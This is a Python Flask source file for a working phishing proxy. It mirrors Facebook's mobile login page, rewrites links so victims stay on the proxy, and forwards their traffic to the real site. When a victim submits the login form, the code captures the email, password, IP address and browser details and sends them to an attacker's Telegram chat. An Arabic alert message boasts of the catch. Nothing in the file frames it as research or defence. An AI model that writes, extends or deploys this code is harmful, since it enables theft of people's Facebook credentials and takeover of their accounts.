import os
import json
import requests
import re
from urllib.parse import urljoin, urlparse, quote, unquote
from flask import Blueprint, redirect, request, Response

secure_fb_bp = Blueprint('facebook', __name__)

def rewrite_urls(html_content, base_url, proxy_base_path):
    html_pattern = re.compile(
        r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action|data-uri|data-jsid))\s*=\s*(["\'])(.*?)\3',
        re.IGNORECASE | re.DOTALL
    )

    css_url_pattern = re.compile(
        r'(url\s*\()(["\']?)(.*?)\2(\))',
        re.IGNORECASE | re.DOTALL
    )

    def replace_html_url(match):
        tag, attr, quote_char, original_url = match.groups()
        if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
            return match.group(0)
        
        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
        if temp_proxy_base_path in original_url:
            return match.group(0)

        absolute_url = urljoin(base_url, original_url)
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"
        
        return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'

    def replace_css_url(match):
        full_match, open_paren, quote_char, original_url, close_paren = match.groups()
        if not original_url or original_url.startswith(('data:', '#')):
            return full_match
        
        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
        if temp_proxy_base_path in original_url:
            return full_match

        absolute_url = urljoin(base_url, original_url)
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"

        return f"{open_paren}{quote_char}{proxied_url}{quote_char}{close_paren}"

    rewritten_html = html_pattern.sub(replace_html_url, html_content)
    rewritten_html = css_url_pattern.sub(replace_css_url, rewritten_html)
    return rewritten_html

def get_real_facebook_url(request_path, query_string):
    if 'url' in query_string:
        original_target_url = query_string.get('url')
        return unquote(original_target_url)
    return "https://m.facebook.com/login.php"

def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
    alert_msg = (
        f"🚨 **تم التقاط صيد {platform} بنجاح عبر نظام الـ MITM!**\n"
        "----------------------------------\n"
        f"📌 **البريد/الهاتف:** `{username}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        f"🌐 **عنوان الـ IP:** `{ip_address}`\n"
        f"🌍 **المتصفح/الجهاز:** `{user_agent}`\n"
        "----------------------------------"
    )
    try:
        bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] Telegram Dispatch Error for {platform}: {e}")

def init_facebook_routes(app, bot):
    @app.route('/login.php', methods=['GET', 'POST'])
    @app.route('/login.php/', methods=['GET', 'POST'])
    @app.route('/login.php/<path:subpath>', methods=['GET', 'POST'])
    def fb_trap(subpath=''):
        target_chat_id = request.args.get('id', None)
        real_fb_url = get_real_facebook_url(request.path, request.args)
        
        proxy_base_path = f"{request.url_root.rstrip('/')}/login.php"
        if target_chat_id:
             proxy_base_path += f"?id={target_chat_id}"

        try:
            headers_to_forward = {
                k: v for k, v in request.headers if k.lower() not in [
                    'host', 'content-length', 'cookie', 'x-forwarded-for', 
                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection', 'accept-encoding'
                ]
            }
            headers_to_forward['Host'] = urlparse(real_fb_url).netloc
            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
            headers_to_forward['Accept-Encoding'] = 'identity' # لمنع ضغط البيانات وقراءتها بشكل سليمة
            
            cookies_to_forward = request.cookies

            if request.method == 'POST':
                username = request.form.get('email') or request.form.get('pass') # احترازي
                password = request.form.get('pass')
                
                source_ip = request.headers.get('CF-Connecting-IP') or \
                            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                            request.remote_addr
                user_agent = request.headers.get('User-Agent', 'Unknown')

                # التقاط البيانات إذا وجدت في الـ POST
                if username and target_chat_id:
                    save_credentials_to_db("Facebook", username, password or "N/A", source_ip, user_agent, target_chat_id, bot)
                
                proxied_response = requests.post(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    data=request.get_data(),
                    cookies=cookies_to_forward,
                    allow_redirects=False,
                    timeout=15
                )
            else:
                proxied_response = requests.get(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    cookies=cookies_to_forward,
                    allow_redirects=False,
                    timeout=15
                )
            
            content_type = proxied_response.headers.get("Content-Type", "").lower()
            
            if "text/html" not in content_type:
                return Response(proxied_response.content, status=proxied_response.status_code, content_type=content_type)

            # معالجة النص وفكه بشكل آمن
            html_content = proxied_response.content.decode('utf-8', errors='ignore')
            modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
            
            response = Response(modified_html, status=proxied_response.status_code)
            
            for key, value in proxied_response.headers.items():
                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'location', 'host', 'content-type']:
                    response.headers[key] = value
            
            response.headers['Content-Type'] = 'text/html; charset=utf-8'

            if proxied_response.status_code in (301, 302, 307, 308) and 'Location' in proxied_response.headers:
                original_location = proxied_response.headers['Location']
                absolute_redirect_url = urljoin(real_fb_url, original_location)
                proxied_redirect_url = f"{proxy_base_path}&url={quote(absolute_redirect_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_redirect_url)}"
                response.headers['Location'] = proxied_redirect_url
            
            return response

        except Exception as e:
            print(f"[-] Facebook Proxy Error: {e}")
            return redirect("https://m.facebook.com/login.php", code=302)
